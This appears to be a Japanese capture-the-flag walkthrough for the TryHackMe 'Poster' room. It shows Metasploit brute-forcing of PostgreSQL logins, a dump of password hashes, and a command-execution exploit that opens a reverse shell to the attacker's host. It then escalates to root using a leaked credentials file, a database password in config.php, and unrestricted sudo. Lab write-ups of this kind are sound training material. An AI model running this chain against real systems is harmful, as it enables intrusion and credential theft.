# Poster CTF

https://tryhackme.com/room/poster

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.72.65
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
MAC Address: 02:E1:E2:08:7C:21 (Unknown)

sudo nmap -sV -p22,80,5432 $TARGET

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
MAC Address: 02:E1:E2:08:7C:21 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

5432でPostgreSQL

## Metasploit

### ログインスキャナ

```shell
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 
RHOSTS => 
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.10.72.65
RHOSTS => 10.10.72.65
msf6 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.72.65:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.72.65:5432 - Login Successful: postgres:password@template1
[-] 10.10.72.65:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.72.65:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### バージョン

```shell
msf6 auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.10.72.65
RHOSTS => 10.10.72.65
msf6 auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.72.65

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

### ユーザーハッシュダンプ

```shell
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS 10.10.72.65
RHOSTS => 10.10.72.65
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### コマンド実行

```shell
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.2.22.182:4444 
[*] 10.10.72.65:5432 - 10.10.72.65:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.72.65:5432 - Exploiting...
[+] 10.10.72.65:5432 - 10.10.72.65:5432 - SsztyBNreDF dropped successfully
[+] 10.10.72.65:5432 - 10.10.72.65:5432 - SsztyBNreDF created successfully
[+] 10.10.72.65:5432 - 10.10.72.65:5432 - SsztyBNreDF copied successfully(valid syntax/command)
[+] 10.10.72.65:5432 - 10.10.72.65:5432 - SsztyBNreDF dropped successfully(Cleaned)
[*] 10.10.72.65:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.2.22.182:4444 -> 10.10.72.65:39952) at 2025-03-19 20:20:26 -0400
```

```shell
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
ls /home
alison
dark
ls -al /home/alison
total 40
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 .
drwxr-xr-x 4 root   root   4096 Jul 28  2020 ..
-rw------- 1 alison alison 2444 Jul 28  2020 .bash_history
-rw-r--r-- 1 alison alison  220 Jul 28  2020 .bash_logout
-rw-r--r-- 1 alison alison 3771 Jul 28  2020 .bashrc
drwx------ 2 alison alison 4096 Jul 28  2020 .cache
drwxr-xr-x 2 alison alison 4096 Jul 28  2020 .nano
-rw-r--r-- 1 alison alison  655 Jul 28  2020 .profile
-rw-r--r-- 1 alison alison    0 Jul 28  2020 .sudo_as_admin_successful
-rw------- 1 alison alison   35 Jul 28  2020 user.txt
-rw-r--r-- 1 root   root    183 Jul 28  2020 .wget-hsts
```

alisonに昇格する必要がある。

## 権限昇格１

```shell
ls -al /home/dark
total 28
drwxr-xr-x 2 dark dark 4096 Jul 28  2020 .
drwxr-xr-x 4 root root 4096 Jul 28  2020 ..
-rw------- 1 dark dark   26 Jul 28  2020 .bash_history
-rw-r--r-- 1 dark dark  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dark dark 3771 Aug 31  2015 .bashrc
-rwxrwxrwx 1 dark dark   24 Jul 28  2020 credentials.txt
-rw-r--r-- 1 dark dark  655 May 16  2017 .profile
```

```shell
cat /home/dark/credentials.txt
dark:ひみつ
```

このパスワードを使って dark で SSH接続できた。

```shell
$ cat /var/www/html/config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "ひみつ";
        $dbname = "mysudopassword";
?>
```

このパスワードを使って alison になれる。

```shell
$ su alison
Password: 
alison@ubuntu:/home/dark$ 
```

```shell
alison@ubuntu:~$ cat user.txt
THM{.......................}
```

## 権限昇格２

```shell
alison@ubuntu:~$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

無制限sudoが付いている。

```shell
alison@ubuntu:~$ sudo bash -p
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:~# cat /root/root.txt
THM{...........................}
```

ルートフラグゲット！

## 振り返り

- postgres 関係の metasploit モジュールを学習できる
- 破壊力のあるモジュールほど、標準的な構成では効果がないことに留意
